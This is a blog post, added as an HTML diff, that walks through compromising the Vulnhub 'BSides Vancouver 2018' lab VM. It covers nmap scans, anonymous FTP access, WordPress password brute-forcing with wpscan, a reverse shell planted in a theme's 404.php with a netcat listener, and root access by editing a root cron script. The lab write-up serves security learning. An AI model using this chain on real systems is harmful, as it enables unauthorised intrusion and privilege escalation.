@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: BSides Vancouver 2018
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Dec, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Vulnhub: BSides Vancouver 2018</a></li>
+        </ul>
+      </nav>
+<h6>(Not ​ another ​ wordpress)</h6>
+<h3>Scanning:</h3>
+<pre><code><span>Nmap scan report ​ for​ 192.168.56.112
+Host is up (0.00011s latency).
+Not​ shown: 997 closed ports
+PORT ​ STATE​ SERVICE
+21/tcp open ftp
+22/tcp open ssh
+80/tcp open http
+</span></code></pre>
+<h4>More Scanning:</h4>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.112
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 15:16 EDT
+Nmap scan report ​ for​ 192.168.56.112
+Host is up (0.000070s latency).
+Not shown: 65532 closed ports
+PORT
+STATE SERVICE VERSION
+21​ /tcp open ftp vsftpd ​ 2.3.5
+| ​ ftp​ -anon: ​ Anonymous​ ​ FTP login allowed (FTP code 230)
+|​ _drwxr​ -xr-x
+2 65534
+65534
+4096 Mar 03 2018 public
+22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol
+[SNIP]
+80​ /tcp open http Apache httpd ​ 2.2.22​ ((Ubuntu))
+| ​ http​ -robots.txt: ​ 1 ​ disallowed entry
+|​ _ ​ /backup_wordpress
+|​ _http​ -server-header: Apache/2.2.22 (Ubuntu)
+|​ _http​ -title: Site doesn't have a title (text/html).
+Service ​ Info​ : OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre>
+<h3>FTP Anonymous login:</h3>
+<pre><code><span>crazyeights@es-base:~$ ftp 192.168.56.112
+Connected ​ to​ 192.168.56.112.220 (vsFTPd 2.3.5)
+Name (192.168.56.112:crazyeights): Anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode ​ to​ transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x 2 65534
+65534
+4096 Mar 03 2018 public
+226 Directory send OK.
+ftp&gt; cd public
+250 Directory successfully changed.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r-- 1 0
+0
+31 Mar 03 2018 users.txt.bk
+226 Directory send OK.
+ftp&gt; get users.txt.bk
+local: users.txt.bk remote: users.txt.bk
+[SNIP]
+</span></code></pre>
+<h3>Looking at users.txt.bk:</h3>
+<pre><code><span>abatchy
+john
+mai
+anne
+doomguy
+</span></code></pre>
+<h3>HTTP:</h3>
+<img src="images/22-000.png" style="width: 80%;">
+<h4>Web Enumeration:</h4>
+<pre><code><span>crazyeights​ @es​ - ​ base:​ ~$ dirb ​ http:​ //192.168.56.112
+GENERATED ​ WORDS:​ ​ 4612
+---- Scanning ​ URL:​ ​ http:​ //192.168.56.112/ ----
++ ​ http:​ //192.168.56.112/cgi-bin/ (CODE:403|SIZE:290)
++ ​ http:​ //192.168.56.112/index (CODE:200|SIZE:177)
++ ​ http:​ //192.168.56.112/index.html (CODE:200|SIZE:177)
++ ​ http:​ //192.168.56.112/robots (CODE:200|SIZE:43)
++ ​ http:​ //192.168.56.112/robots.txt (CODE:200|SIZE:43)
++ ​ http:​ //192.168.56.112/server-status (CODE:403|SIZE:295)
+</span></code></pre>
+<h4>Checking robots.txt:</h4>
+<pre><code><span>robots.​ txt:
+User-​ agent:​ *
+Disallow:​ /backup_wordpress
+</span></code></pre>
+<h3>Checking out /backup_wordpress:</h3>
+<img src="images/22-002.png" style="width: 80%;">
+<h3>Enumerating Wordpress Users:</h3>
+<pre><code><span>crazyeights@es-base:~$ wpscan --url http://192.168.56.112/backup_wordpress/
+-e u
+[i] User(s) Identified:
+[+] john
+| Found By: Author Posts - Display Name (Passive Detection)
+| Confirmed By:
+| Rss Generator (Passive Detection)
+| Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+| Login Error Messages (Aggressive Detection)
+[+] admin
+| Found By: Author Posts - Display Name (Passive Detection)
+| Confirmed By:
+| Rss Generator (Passive Detection)
+| Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+| Login Error Messages (Aggressive Detection)
+</span></code></pre>
+<h3>Cracking users passwords:</h3>
+<pre><code><span>crazyeights@es-​ base​ :~$ wpscan --url http://192.168.56.112/backup_wordpress/
+--passwords lists/rockyou-40.txt --usernames john,admin
+[​ + ​ ] Performing password attack ​ on​ Xmlrpc against ​ 2 ​ user/s
+[​ SUCCESS​ ] - ​ john / enigma
+</span></code></pre>
+<p>Log into wordpress with credentials john:enigma</p>
+<p>Go to Appearance > Editor > 404.php, and replace the template with a rever shell.</p>
+<h5>Putting a reverse shell in 404.php:</h5>
+<p>Run nc -lvp 1234, then paste the reverse shell and save:</p>
+<img src="images/22-004.png" style="width: 80%;">
+<p>If the listener does not connect immediately when the template is saved fo to wp-content/themes/twentysixteen/404.php</p>
+<img src="images/22-006.png" style="width: 60%;">
+<h3>Priv. Escalation:</h3>
+<p>This might work, I didn’t test it:</p>
+<img src="images/22-008.png" style="width: 60%;">
+<pre><code><span>$ lsb_release -a
+No​ LSB modules are available.
+Distributor ID:
+Ubuntu
+Description:
+Ubuntu 12.04.4 LTS
+Release:
+12.04
+Codename:
+precise
+</span></code></pre>
+<p>(There is probably an exploit for this too)</p>
+<h3>Checking out wp_config.php:</h3>
+<p>(Sometimes there are credentials)</p>
+<img src="images/22-010.png" style="width: 60%;">
+<h3>Checking out crontab:</h3>
+<p>(Path of least resistance)</p>
+<pre><code><span>$ cat crontab
+[SNIP]
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+[SNIP]
+#$ * * * * root /usr/local/bin/cleanup
+</span></code></pre>
+<h3>Checking out cleanup:</h3>
+<img src="images/22-012.png" style="width: 80%;">
+<p>Getting the root flag in an extremely lazy way:
+Modifying cleanup script:</p>
+<pre><code><span>$ echo cp /root/flag.txt /home/flag.txt &gt;&gt; cleanup
+$ cat cleanup
+#!/bin/sh
+[SNIP]
+cp /root/flag.txt /home/flag.txt
+</span></code></pre>
+<p>Checking the /home directory for the flag:</p>
+<pre><code><span>$ ls -lai /home
+total 32
+393219 drwxr-xr-x 7 root  root 4096 Sep 26 13:35 .
+     2 drwxr-xr-x 23 root root 4096 Mar 3 2018 ..
+420171 -rw-r--r-- 1 root  root 248 Sep 26 13:36 flag.txt
+[SNIP]
+</span></code></pre>
+<h3>Getting the flag:</h3>
+<pre><code><span>$ ​ cat​ /home/flag.txt
+Congratulations!
+If you can ​ read​ this, that means you were able ​ to​ obtain root permissions
+on​ this VM.
+You should ​ be​ proud!
+There are multiple ways ​ to​ gain access remotely, ​ as​ well ​ as​ ​ for​ privilege
+escalation.Did you ​ find​ them ​ all​ ?
+@abatchy17
+</span></code></pre>
+<p>FIN (ish).</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
